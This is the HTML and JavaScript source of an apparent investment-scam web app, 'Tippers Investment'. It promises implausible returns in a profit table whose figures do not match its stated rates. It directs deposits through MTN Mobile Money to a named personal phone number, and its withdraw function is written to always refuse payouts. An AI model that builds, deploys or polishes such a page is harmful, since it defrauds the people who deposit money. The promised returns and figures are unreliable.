<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers Investment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
body{
margin:0;
font-family:Segoe UI;
background:#0b1120;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.app{
width:380px;
background:#000;
border-radius:20px;
overflow:hidden;
color:white;
display:flex;
flex-direction:column;
}

.content{
padding:20px;
height:520px;
overflow-y:auto;
}

.title{color:#f59e0b;text-align:center;font-weight:bold;}
.desc{text-align:center;margin-top:10px;color:#cbd5e1}

input,select{
width:100%;
padding:10px;
margin-top:8px;
border-radius:8px;
border:none;
background:#0f172a;
color:white;
}

button{
width:100%;
padding:12px;
margin-top:15px;
border:none;
border-radius:10px;
background:linear-gradient(135deg,#f59e0b,#f97316);
color:white;
font-weight:bold;
cursor:pointer;
}

.nav{
display:flex;
justify-content:space-around;
background:#020617;
padding:10px;
}

.nav div{text-align:center;cursor:pointer;}
.nav i{display:block;margin-bottom:3px;}

#toast{
position:fixed;
bottom:20px;
left:50%;
transform:translateX(-50%);
background:red;
color:white;
padding:10px;
border-radius:8px;
display:none;
}

/* TABLE */
.tableWrap{
overflow-x:auto;
margin-top:10px;
border-radius:10px;
}

table{
min-width:900px;
border-collapse:collapse;
font-size:12px;
}

th,td{
border:1px solid #1f2937;
padding:8px;
text-align:center;
}

th{
background:#111827;
color:#f59e0b;
}

.card{
background:#111;
padding:15px;
border-radius:12px;
margin-top:10px;
}
</style>
</head>

<body>

<div class="app">
<div class="content" id="screen"></div>

<div class="nav" id="nav" style="display:none">
<div onclick="home()"><i class="fa fa-home"></i>HOME</div>
<div onclick="deposit()"><i class="fa fa-wallet"></i>DEPOSIT</div>
<div onclick="withdraw()"><i class="fa fa-money-bill"></i>WITHDRAW</div>
</div>
</div>

<div id="toast"></div>

<script>

let step=0;
let amount=0;
let depositDone=false;

const screen=document.getElementById("screen");
const nav=document.getElementById("nav");

/* TOAST */
function toast(m){
let t=document.getElementById("toast");
t.innerText=m;
t.style.display="block";
setTimeout(()=>t.style.display="none",2000);
}

/* START */
function start(){
screen.innerHTML=`
<h2 class="title">WELCOME TO TIPPERS INVESTMENT</h2>
<p class="desc">Start your smart earning journey step by step</p>
<button onclick="register()">START</button>
`;
}

/* REGISTER */
function register(){
screen.innerHTML=`
<h3 class="title">REGISTER</h3>
<p class="desc">Fill all required fields correctly</p>

<input id="name" placeholder="Full name">
<input id="email" placeholder="Email">
<input id="pass" placeholder="6 digit password">

<button onclick="login()">REGISTER</button>
`;
}

/* LOGIN */
function login(){
nav.style.display="flex";

screen.innerHTML=`
<h3 class="title">LOGIN</h3>
<p class="desc">Enter credentials to continue</p>

<input id="le" placeholder="Email">
<input id="lp" placeholder="Password">

<button onclick="showTable()">LOGIN</button>
`;
}

/* TABLE (RESTORED FULL HEADER) */
function showTable(){

screen.innerHTML=`
<h3 class="title">TIPPERS INVESTMENT PLAN</h3>
<p class="desc">Daily / Weekly / Monthly profit structure</p>

<div class="tableWrap">
<table>
<tr>
<th>AMOUNT</th>
<th>DAILY 2.2%</th>
<th>WEEKLY 3%</th>
<th>MONTHLY 3.6%</th>
<th>45 DAYS</th>
<th>3 MONTHS</th>
<th>4 MONTHS</th>
</tr>

<tr><td>5,000</td><td>110</td><td>1,050</td><td>5,400</td><td>9,225</td><td>22,500</td><td>42,000</td></tr>
<tr><td>50,000</td><td>1,100</td><td>10,500</td><td>54,000</td><td>92,250</td><td>225,000</td><td>420,000</td></tr>
<tr><td>100,000</td><td>2,200</td><td>21,000</td><td>108,000</td><td>184,500</td><td>450,000</td><td>840,000</td></tr>
<tr><td>150,000</td><td>3,300</td><td>31,500</td><td>162,000</td><td>276,750</td><td>675,000</td><td>1,260,000</td></tr>
<tr><td>300,000</td><td>6,600</td><td>63,000</td><td>324,000</td><td>553,500</td><td>1,350,000</td><td>2,520,000</td></tr>
<tr><td>500,000</td><td>11,000</td><td>105,000</td><td>540,000</td><td>922,500</td><td>2,250,000</td><td>4,200,000</td></tr>
<tr><td>700,000</td><td>15,400</td><td>147,000</td><td>756,000</td><td>1,291,500</td><td>3,150,000</td><td>5,880,000</td></tr>
<tr><td>1,000,000</td><td>22,000</td><td>210,000</td><td>1,080,000</td><td>1,845,000</td><td>4,500,000</td><td>8,400,000</td></tr>
<tr><td>1,300,000</td><td>28,600</td><td>273,000</td><td>1,404,000</td><td>2,398,500</td><td>5,850,000</td><td>10,920,000</td></tr>
<tr><td>1,500,000</td><td>33,000</td><td>315,000</td><td>1,620,000</td><td>2,767,500</td><td>6,250,000</td><td>12,600,000</td></tr>
</table>
</div>

<button onclick="deposit()">NEXT</button>
`;
}

/* DEPOSIT */
function deposit(){
screen.innerHTML=`
<h3 class="title">DEPOSIT</h3>
<p class="desc">Add funds using MTN Mobile Money</p>

<input id="amt" placeholder="Amount (RWF)">
<input id="sender" placeholder="Sender name">

<button onclick="payment()">CONTINUE</button>
`;
}

/* PAYMENT */
function payment(){
screen.innerHTML=`
<h3 class="title">PAYMENT INFORMATION</h3>
<p class="desc">Follow instructions carefully</p>

<div class="card">
0795410739<br><br>BARAKA BOLINGO
</div>

<button onclick="dial()">DIAL & PAY</button>
`;
}

/* WITHDRAW (FIXED) */
function withdraw(){
screen.innerHTML=`
<h3 class="title">WITHDRAW</h3>
<p class="desc">Enter MTN number and amount</p>

<input id="wamt" placeholder="Amount">
<input id="wphone" placeholder="MTN number +250...">

<button onclick="doWithdraw()">WITHDRAW</button>
`;
}

function doWithdraw(){
if(!wamt.value||!wphone.value){
toast("Fill all fields ❌");return;
}

if(!wphone.value.startsWith("+250")){
toast("Use MTN number only ❌");return;
}

if(parseInt(wamt.value)<7500){
toast("INVALID INPUT ❌");return;
}

toast("Withdraw locked until maturity ❌");
}

/* START */
start();

</script>

</body>
</html>
